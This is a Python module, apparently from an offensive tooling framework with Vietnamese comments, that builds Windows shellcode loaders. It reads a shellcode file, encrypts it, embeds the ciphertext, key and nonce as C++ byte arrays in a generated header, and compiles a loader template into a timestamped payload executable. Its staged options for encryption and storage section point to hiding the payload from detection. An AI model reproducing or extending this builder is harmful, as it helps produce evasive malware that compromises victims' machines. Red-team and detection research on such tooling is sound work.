# controller/modules/builder.py
import os
import time
import subprocess
import logging
from controller.config import PROJECT_ROOT, OUTPUT_DIR, BUILD_DIR

# Import các module trợ giúp mới
from controller.modules.definitions import get_defines
from controller.modules.crypto_utils import apply_encryption

class PayloadBuilder:
    def __init__(self, shellcode_path, options):
        self.shellcode_path = shellcode_path
        self.options = options
        self.logger = logging.getLogger("Builder")

    def _read_shellcode(self):
        try:
            with open(self.shellcode_path, 'rb') as f:
                return f.read()
        except FileNotFoundError:
            self.logger.error(f"Shellcode not found: {self.shellcode_path}")
            return None

    def _format_cpp_array(self, data):
        """Chuyển đổi bytes thành chuỗi C++ array: {0x00, 0x01...}"""
        return "{" + ", ".join([f"0x{b:02x}" for b in data]) + "};"

    def _write_payload_header(self, output: dict, build_dir: str):
        """Sinh payload_data.h chứa toàn bộ encrypted data"""
        
        lines = ["#pragma once", "#include <stdint.h>", ""]
        
        method = output["method"]
        ciphertext = output["ciphertext"]
        key = output.get("key", b"")
        nonce = output.get("nonce", b"")
        storage_technique = self.options.get("t1", "rdata")
        
        # Shellcode
        if storage_technique == "data":
            lines.append(f"unsigned char PAYLOAD[] = {self._format_cpp_array(ciphertext)};")
        else:
            lines.append(f"const unsigned char PAYLOAD[] = {self._format_cpp_array(ciphertext)};")
        lines.append(f"unsigned int  PAYLOAD_LEN = {len(ciphertext)};")
        lines.append("")
        
        # Key (nếu có)
        if key:
            lines.append(f"unsigned char PAYLOAD_KEY[] = {self._format_cpp_array(key)};")
            lines.append(f"unsigned int  PAYLOAD_KEY_LEN = {len(key)};")
        else:
            lines.append("unsigned char PAYLOAD_KEY[] = {};")
            lines.append("unsigned int  PAYLOAD_KEY_LEN = 0;")
        lines.append("")
        
        # Nonce (nếu có)
        if nonce:
            lines.append(f"unsigned char PAYLOAD_NONCE[] = {self._format_cpp_array(nonce)};")
            lines.append(f"unsigned int  PAYLOAD_NONCE_LEN = {len(nonce)};")
        else:
            lines.append("unsigned char PAYLOAD_NONCE[] = {};")
            lines.append("unsigned int  PAYLOAD_NONCE_LEN = 0;")
        lines.append("")
        
        # Method string (optional, debug only)
        lines.append(f'const char*   PAYLOAD_METHOD = "{method}";')

        header_path = os.path.join(build_dir, "payload_data.h")
        with open(header_path, "w") as f:
            f.write("\n".join(lines))

    def build(self):
        # 1. Đọc Shellcode (Stage 1 Init)
        raw_sc = self._read_shellcode()
        if not raw_sc: return None

        # 2. Xử lý Mã hóa (Stage 3 Transformation - Build Time)
        enc_method = self.options.get('t3', 'none')
        output = apply_encryption(raw_sc, enc_method)

        # 3. Dọn build cũ trước khi sinh file mới
        subprocess.run(["make", "clean"], cwd=PROJECT_ROOT, capture_output=True)
        
        # 4. Chuẩn bị Template C++
        try:
            os.makedirs(BUILD_DIR, exist_ok=True)
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            os.makedirs(os.path.join(PROJECT_ROOT, 'build', 'obj'), exist_ok=True)
            self._write_payload_header(output, BUILD_DIR)

        except Exception as e:
            self.logger.error(f"Header generation failed: {e}")
            return None


        # 5. Copy main.cpp → build/src/generated_loader.cpp
        try:
            import shutil
            src_template = os.path.join(PROJECT_ROOT, 'src', 'main.cpp')
            src_file     = os.path.join(BUILD_DIR, 'generated_loader.cpp')
            shutil.copy(src_template, src_file)
        except Exception as e:
            self.logger.error(f"Template copy failed: {e}")
            return None

        # 6. Defines + Make
        defines_str = get_defines(self.options)
        output_name = f"payload_{int(time.time())}.exe"

        cmd = ["make", "build",
               f"SRC={os.path.basename(src_file)}",
               f"OUT={output_name}",
               f"DEFINES={defines_str}"]

        self.logger.info(f"Compiling with flags: {defines_str}")

        try:
            subprocess.run(cmd, cwd=PROJECT_ROOT, check=True, capture_output=True)
            full_path = os.path.join(OUTPUT_DIR, output_name)
            self.logger.info(f"Build Success: {full_path}")
            return full_path
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Build Failed!\n{e.stderr.decode()}")
            return None